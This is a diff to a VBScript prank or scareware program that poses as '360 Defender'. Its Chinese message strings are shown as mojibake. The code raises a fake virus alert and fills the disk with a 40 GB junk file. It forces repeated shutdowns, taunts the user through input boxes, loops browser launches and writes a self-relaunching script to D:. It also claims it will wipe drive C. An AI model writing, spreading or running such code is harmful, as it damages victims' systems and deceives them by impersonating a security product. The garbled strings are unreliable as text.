@@ -6,7 +6,7 @@ set qwrite = CreateObject("scripting.filesystemobject")
 
 set qsay = CreateObject("sapi.spvoice")
 
-msgbox "ÄúµÄµçÄÔÒÑ±»²¡¶¾ÈëÇÖ£¡",vbokonly+vbExclamation,"360 Defender"
+msgbox "æ‚¨çš„ç”µè„‘å·²è¢«ç—…æ¯’å…¥ä¾µï¼",vbokonly+vbExclamation,"360 Defender"
 
 qstart.run "cmd.exe /c start appwiz.cpl"
 
@@ -222,17 +222,17 @@ qstart.run "cmd.exe /c fsutil file createnew 666.bug 40000000000"
 
 wscript.sleep 25000
 
-qstart.run "cmd.exe /c shutdown -s -t 60 -c ""360¹«Ë¾ÎÂÜ°ÌáĞÑ£ºÒòÎªÕâ¸öÓÎÏ·Éæ¼°·Ç·¨ÄÚÈİ£¬ËùÒÔÄúµÄµçÄÔ½«ÔÚ60Ãëºó×Ô¶¯¹Ø»ú"" ",0,true
+qstart.run "cmd.exe /c shutdown -s -t 125 -c ""360å…¬å¸æ¸©é¦¨æé†’ï¼šå› ä¸ºè¿™ä¸ªæ¸¸æˆæ¶‰åŠéæ³•å†…å®¹ï¼Œæ‰€ä»¥æ‚¨çš„ç”µè„‘å°†åœ¨125ç§’åè‡ªåŠ¨å…³æœº"" ",0,true
 
-qstart.run "cmd.exe /c echo ¹ö|clip"
+qstart.run "cmd.exe /c echo æ»š|clip"
 
-A = INPUTBOX ("Ëµ£¡360ÊÇ²»ÊÇÉÏµÛ£¿"+chr(13)+chr(13)+chr(13)+"(¡°¹ö¡±ÒÑ¸´ÖÆµ½¼ôÌù°å£¬¿ÉÒÔÕ³Ìù¡£)","360 Defender","²»ÊÇ",8000,7000)
+A = INPUTBOX ("è¯´ï¼360æ˜¯ä¸æ˜¯ä¸Šå¸ï¼Ÿ"+chr(13)+chr(13)+chr(13)+"(â€œæ»šâ€å·²å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼Œå¯ä»¥ç²˜è´´ã€‚)","360 Defender","ä¸æ˜¯",8000,7000)
 
-IF A = "ÊÇ" then
+IF A = "æ˜¯" then
 
 qstart.run "cmd.exe /c shutdown -a",0,true
 
-msgbox "ºÃµÄ£¬ÏÖÔÚÄú¿ÉÒÔÏÂÔØ360°²È«ÎÀÊ¿À´É±¶¾ÁË¡£",vbokonly,"360 Defender"
+msgbox "å¥½çš„ï¼Œç°åœ¨æ‚¨å¯ä»¥ä¸‹è½½360å®‰å…¨å«å£«æ¥æ€æ¯’äº†ã€‚",vbokonly,"360 Defender"
 
 do
 
@@ -240,21 +240,21 @@ qweb.run"https://hao.360.com/"
 
 loop
 
-ELSEIF A = "²»ÊÇ" then
+ELSEIF A = "ä¸æ˜¯" then
 
 qstart.run "cmd.exe /c shutdown -a",0,true
 
-msgbox chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+"ÄúÔõÃ´ÕâÃ´ÀÁÄØ£¿",vbokonly+vbQuestion,"360 Defender"
+msgbox chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+"æ‚¨æ€ä¹ˆè¿™ä¹ˆæ‡’å‘¢ï¼Ÿ",vbokonly+vbQuestion,"360 Defender"
 
-msgbox chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+"ÊÇÊ±ºò¶ÍÁ¶¶ÍÁ¶ÁË",vbokonly+vbInformation,"360 Defender"
+msgbox chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+chr(13)+"æ˜¯æ—¶å€™é”»ç‚¼é”»ç‚¼äº†",vbokonly+vbInformation,"360 Defender"
 
-msgbox "ÓÎÏ·¹æÔò£ºÔÚ¿ªÊ¼ºó£¬Çë¼°Ê±µã»÷ ¡°È·¶¨¡± ¼üÀ´È¡Ïû¹Ø»ú¡£"+chr(13)+"ÏÖÔÚÄú¿ÉÒÔ°ÑÕâ¸ö´°¿Úxµô£¬»òÕßµã»÷È·¶¨£¬À´¿ªÊ¼ÓÎÏ·¡£",vbokonly+vbInformation,"360 Defender"
+msgbox "æ¸¸æˆè§„åˆ™ï¼šåœ¨å¼€å§‹åï¼Œè¯·åŠæ—¶ç‚¹å‡» â€œç¡®å®šâ€ é”®æ¥å–æ¶ˆå…³æœºã€‚"+chr(13)+"ç°åœ¨æ‚¨å¯ä»¥æŠŠè¿™ä¸ªçª—å£xæ‰ï¼Œæˆ–è€…ç‚¹å‡»ç¡®å®šï¼Œæ¥å¼€å§‹æ¸¸æˆã€‚",vbokonly+vbInformation,"360 Defender"
 
 do
 
 qstart.run "cmd.exe /c shutdown -s -t 5 ",0,true
 
-msgbox "È¡Ïû¹Ø»ú",vbokonly,"360 Defender"
+msgbox "å–æ¶ˆå…³æœº",vbokonly,"360 Defender"
 
 qstart.run "cmd.exe /c shutdown -a",0,true
 
@@ -270,9 +270,9 @@ ELSEIF A = "" then
 
 qstart.run "cmd.exe /c shutdown -a",0,true
 
-msgbox "ÖÜºèµt±íÊ¾ÎŞÓï¡£"+chr(13)+chr(13)+chr(13)+"ÕâÑùÊÇ²»¿ÉÄÜ½â¾öÎÊÌâµÄ",vbokonly,"360 Defender"
+msgbox "å‘¨é¸¿ç¥è¡¨ç¤ºæ— è¯­ã€‚"+chr(13)+chr(13)+chr(13)+"è¿™æ ·æ˜¯ä¸å¯èƒ½è§£å†³é—®é¢˜çš„",vbokonly,"360 Defender"
 
-msgbox "×Ô¼ºÌ½Ñ°°É",vbokonly,"360 Defender"
+msgbox "è‡ªå·±æ¢å¯»å§",vbokonly,"360 Defender"
 
 do
 
@@ -306,7 +306,7 @@ qstart.run "cmd.exe /c shutdown -a",0,true
 
 loop
 
-ELSEIF A = "¹ö" then
+ELSEIF A = "æ»š" then
 
 qstart.run "cmd.exe /c shutdown -a",0,true
 
@@ -316,7 +316,7 @@ set qwriteb=qwrite.CreateTextFile( "D:\1.txt",,ture)
 
 qwriteb.WriteLine "wscript.CreateObject(" & chr(34) & "wscript.shell" & chr(34) & ").run " & chr(34) & "D:\1.vbs" & chr(34)
 
-qwriteb.WriteLine "msgbox " & chr(34) & "¹ö" & chr(34) & ",vbokonly+vbinformation," & chr(34) & "360 Defender" & chr(34)
+qwriteb.WriteLine "msgbox " & chr(34) & "æ»š" & chr(34) & ",vbokonly+vbinformation," & chr(34) & "360 Defender" & chr(34)
 
 qwriteb.close
 
@@ -328,9 +328,9 @@ ELSE
 
 qstart.run "cmd.exe /c shutdown -a",0,true
 
-msgbox "ÓÉÓÚÄúÔÚËµ·Ï»°£¬µ«ÊÇÄúÒ»¶¨²»ÏëÀË·ÑÊ±¼äËµ·Ï»°£¬ËùÒÔ¸ÃµçÄÔ¶ÔÄúÓĞº¦¡£ÀË·Ñ±ğÈËÊ±¼ä¾ÍÊÇÄ±²Æº¦Ãü ( Â³Ñ¸ ) ¡£360»ı¼«Î¬»¤ÄúµÄ²Æ²úÈ¨ºÍÉúÃü½¡¿µÈ¨£¬¾ö¶¨²»ÔÒµôÄúµÄµçÄÔ¡£"+chr(13)+chr(13)+"ÄÇÏÖÔÚÏÈ°ÑCÅÌ¸øÄ¨¿©£¡",vbokonly+vbInformation,"360 Defender"
+msgbox "ç”±äºæ‚¨åœ¨è¯´åºŸè¯ï¼Œä½†æ˜¯æ‚¨ä¸€å®šä¸æƒ³æµªè´¹æ—¶é—´è¯´åºŸè¯ï¼Œæ‰€ä»¥è¯¥ç”µè„‘å¯¹æ‚¨æœ‰å®³ã€‚æµªè´¹åˆ«äººæ—¶é—´å°±æ˜¯è°‹è´¢å®³å‘½ ( é²è¿… ) ã€‚360ç§¯æç»´æŠ¤æ‚¨çš„è´¢äº§æƒå’Œç”Ÿå‘½å¥åº·æƒï¼Œå†³å®šä¸ç ¸æ‰æ‚¨çš„ç”µè„‘ã€‚"+chr(13)+chr(13)+"é‚£ç°åœ¨å…ˆæŠŠCç›˜ç»™æŠ¹å’¯ï¼",vbokonly+vbInformation,"360 Defender"
 
-qsay.speak ("ÔÚÄ¨µôCÅÌµÄ¹ı³ÌÖĞ£¬ÄúµÄµçÄÔ½«»áÖØÆôÊı´Î´Ë´ÉßÚßÚ´É´Ë´Î´Î´Ë´ÉßÚßÚ´É´Ë´Î´Î´Ë´ÉßÚ")
+qsay.speak ("åœ¨æŠ¹æ‰Cç›˜çš„è¿‡ç¨‹ä¸­ï¼Œæ‚¨çš„ç”µè„‘å°†ä¼šé‡å¯æ•°æ¬¡æ­¤ç“·å‘²å‘²ç“·æ­¤æ¬¡æ¬¡æ­¤ç“·å‘²å‘²ç“·æ­¤æ¬¡æ¬¡æ­¤ç“·å‘²")
 
 qweb.run"https://hao.360.com/"
 
